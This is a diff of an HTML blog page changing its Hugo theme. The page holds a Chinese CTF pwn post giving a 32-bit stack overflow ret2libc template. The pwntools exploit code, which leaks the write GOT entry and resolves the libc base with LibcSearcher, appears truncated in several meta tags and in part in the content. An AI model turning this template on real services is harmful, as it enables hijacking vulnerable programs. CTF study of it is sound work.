@@ -1,138 +1,84 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>32位栈溢出rop模板</title>
-    <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>
+      
+          32位栈溢出rop模板 - Ssd&#39;s Blog
+      
+  </title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="" />
+  <link rel="shortcut icon" type="image/x-icon" href="/img/">
 
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://shaodongshi.github.io/style.min.39acacc5d2051426f655a6b7fbf4786fbd0fd8fffd09322c9b497ef0f7439b3f.css" integrity="sha256-OaysxdIFFCb2Vaa3&#43;/R4b70P2P/9CTIsm0l&#43;8PdDmz8=">
+  
+  
+  
+  <link rel="stylesheet" href="https://shaodongshi.github.io/style-dark.min.0a647fb6c07e04b77b54fa0515d0a683d39ecdb251dba960fe1f966f7ff36fc2.css" media="(prefers-color-scheme: dark)" integrity="sha256-CmR/tsB&#43;BLd7VPoFFdCmg9OezbJR26lg/h&#43;Wb3/zb8I=">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
 
-<link rel="stylesheet" href="/css/bootstrap.min.css"/>
-<link rel="stylesheet" href="/css/layouts/main.css"/>
-<link rel="stylesheet" href="/css/navigators/navbar.css"/>
-<link rel="stylesheet" href="/css/plyr.css"/>
-<link rel="stylesheet" href="/css/flag-icon.min.css"/>
+  
+  
 
-
-<link href="https://fonts.googleapis.com/css2?family=Muli:wght@300;400;500;600" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" />
-
-
-
-
-<meta property="og:title" content="32位栈溢出rop模板" />
+  <meta property="og:title" content="32位栈溢出rop模板" />
 <meta property="og:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-07-11T17:26:35+08:00" />
 <meta property="article:modified_time" content="2021-07-11T17:26:35+08:00" />
 
+<meta itemprop="name" content="32位栈溢出rop模板">
+<meta itemprop="description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc."><meta itemprop="datePublished" content="2021-07-11T17:26:35+08:00" />
+<meta itemprop="dateModified" content="2021-07-11T17:26:35+08:00" />
+<meta itemprop="wordCount" content="145">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:image" content="https://shaodongshi.github.io//img/"/>
+<meta name="twitter:title" content="32位栈溢出rop模板"/>
+<meta name="twitter:description" content="32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; process_name = &#39;./&#39; #p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;}) p = remote(&#39;&#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &#39;A&#39;*(偏移) &#43; payload p.sendlineafter(&#39;&#39;, payload) main_addr = write_plt = elf.plt[&#39;write&#39;] write_got = elf.got[&#34;write&#34;] payload = p32(write_plt) &#43; p32(main_addr) &#43; p32(1) &#43; p32(write_got) &#43; p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&#34;write_addr =&gt; %#x&#34;, write_addr) libc = LibcSearcher(&#39;write&#39;, write_addr) libc_base = write_addr - libc."/>
 
+  <!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
 
+  <!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <![endif]-->
+
+  
+  
+</head>
+
+  <body>
     
-    
-<meta name="description" content="32位栈溢出rop模板" />
-<link
-  rel="stylesheet"
-  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-dark.min.css"
-/>
-<link rel="stylesheet" href="/css/layouts/single.css"/>
-<link rel="stylesheet" href="/css/navigators/sidebar.css">
-
-<link rel="stylesheet" href="/css/style.css"/>
-
-
-
-    
-    
-  </head>
-
-  <body data-spy="scroll" data-target="#TableOfContents" data-offset="80">
-    <div class="container-fluid bg-dimmed wrapper">
-      
-      
-    
-
-
-
-
-
-
-
-
-
-
-
-
-<nav class="navbar navbar-expand-xl top-navbar final-navbar shadow">
-  <div class="container">
-      <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button" onclick="toggleSidebar()">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-    <a class="navbar-brand" href="/">
-      Ssd&#39;s Blog</a>
-    <button class="navbar-toggler navbar-light" id="toc-toggler" type="button" onclick="toggleTOC()">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-
-    <div class="collapse navbar-collapse lang-selector" id="top-nav-items">
-      <ul class="navbar-nav ml-auto">
-      
-      </ul>
-    </div>
+  <h1>32位栈溢出rop模板</h1>
+  <header>
+  
+  <div class="avatar">
+    <img class="avatarMask" src="https://shaodongshi.github.io//img/" alt="">
+    <a href="https://shaodongshi.github.io/"><img class="avatar-border" src="https://shaodongshi.github.io//img/avatar-border.svg" alt=""></a>
   </div>
   
+  <h2><a class="author" href="https://shaodongshi.github.io/"></a></h2>
+</header>
+
   
   
-</nav>
-
-
-
-      
-      
-  <section class="sidebar-section" id="sidebar-section">
-    <div class="sidebar-holder">
-      <div class="sidebar" id="sidebar">
-        <form class="mx-auto" method="get" action="/search">
-          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
-        </form>
-        <div class="sidebar-tree">
-          <ul class="tree" id="tree">
-            <li id="list-heading"><a href="/posts" data-filter="all">Posts</a></li>
-            <div class="subtree">
-                
-
-            </div>
-          </ul>
-        </div>
-      </div>
-    </div>
-  </section>
-
-
-      
-      
-<section class="content-section" id="content-section">
-  <div class="content">
-    <div class="container p-0 read-area">
-      
-      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(https://shaodongshi.github.io/images/default-hero.jpg);'>
-      </div>
-
-      
-      <div class="page-content">
-        <div class="author-profile ml-auto align-self-lg-center">
-          <img class="rounded-circle" src='/images/default-avatar_hud3032af26cae4ad3a900356053a829cd_96315_120x120_fit_box_2.png' alt="Author Image">
-          <h5 class="author-name"></h5>
-          <p>July 11, 2021</p>
-        </div>
-
-        <div class="title">
-          <h1>32位栈溢出rop模板</h1>
-        </div>
-
-        <div class="post-content" id="post-content">
-          <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
+  
+  <p class="date">July 11, 2021</p>
+  
+  
+  
+  
+  <div id="contentBody">
+    <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
 <span style="color:#75715e">#coding=utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -183,184 +129,14 @@ send_payload(payload)
 <span style="color:#75715e">#****************************</span>
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div>
-        </div>
-
-        
-        
-          <div class="btn-improve-page">
-              <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts%5c32%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29.md" title="Improve this page" target="_blank" rel="noopener">
-                <i class="fas fa-code-branch"></i>
-                Improve this page
-              </a>
-          </div>
-        
-
-        
-      <hr />
-        
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="row next-prev-navigator">
-  
-  
-</div>
-
-      <hr />
-      
-      
-      </div>
-    </div>
   </div>
-  
-  <a id="scroll-to-top" class="btn"><i class="fas fa-chevron-circle-up"></i></a>
-  
-</section>
-
-
-      
-      
-  <section class="toc-section" id="toc-section">
-    
-    <div class="toc-holder">
-      <h5 class="text-center pl-3">Table of Contents</h5>
-      <hr>
-      <div class="toc">
-        <nav id="TableOfContents"></nav>
-      </div>
-    </div>
-    
-  </section>
-
-    </div>
-
-    
-    
-
-
-
-
-
-
-
-
-
-  
-    
-  
-
-
-
-  
-  
-
-  
-  
-
-  
-  
-
-
-  
-  
-  
-
-  
-  
-  
-
-  
-  
-  
-    
-  
-  
-
-  
-  
-  
-
-  <footer class="container-fluid text-center align-content-center footer pb-2">
-    <div class="container pt-5">
-      <div class="row text-left">
-        
-        <div class="col-md-4 col-sm-12">
-          <h5>Navigation</h5>
-          
-        </div>
-        
-        
-        
-        
-          
-          <div class="col-md-4 col-sm-12">
-            <p>Stay up to date with email notification</p>
-            
-             
-              <form>
-                <div class="form-group">
-                  <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email"/>
-                  <small id="emailHelp" class="form-text text-muted">By entering your email address, you agree to receive the newsletter of this website.</small>
-                </div>
-                <button type="submit" class="btn btn-info">Submit</button>
-              </form>
-            
-          </div>
-        
-      </div>
-    </div>
-    
-    
-    <hr />
-    <div class="container">
-      <div class="row text-left">
-        <div class="col-md-4">
-          <a id="theme" href="https://github.com/hossainemruz/toha" target="_blank" rel="noopener">
-            <img src="/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_2.png" alt="Toha Theme Logo">
-            Toha
-          </a>
-        </div>
-        <div class="col-md-4 text-center">© 2021 Copyright.</div>
-        <div class="col-md-4 text-right">
-          <a id="hugo" href="https://gohugo.io/" target="_blank" rel="noopener">Powered by
-          <img
-            src="/images/hugo-logo.svg"
-            alt="Hugo Logo"
-            height="18"
-          />
-          </a>
-        </div>
-      </div>
-    </div>
-    
-  </footer>
-
-
-    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
-<script type="text/javascript" src="/js/popper.min.js"></script>
-<script type="text/javascript" src="/js/bootstrap.min.js"></script>
-
-<script type="text/javascript" src="/js/navbar.js"></script>
-<script type="text/javascript" src="/js/plyr.js"></script>
-<script type="text/javascript" src="/js/main.js"></script>
-
-
-    
-    
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js"></script>
-<script src="/js/single.js"></script>
-<script>
-  hljs.initHighlightingOnLoad();
-</script>
+  <footer>
+  <p>
+  &copy;  .
+  Powered by <a href="https://gohugo.io/">Hugo</a>
+  using the <a href="https://github.com/koirand/pulp/">pulp</a> theme.
+  </p>
+</footer>
 
 
   </body>
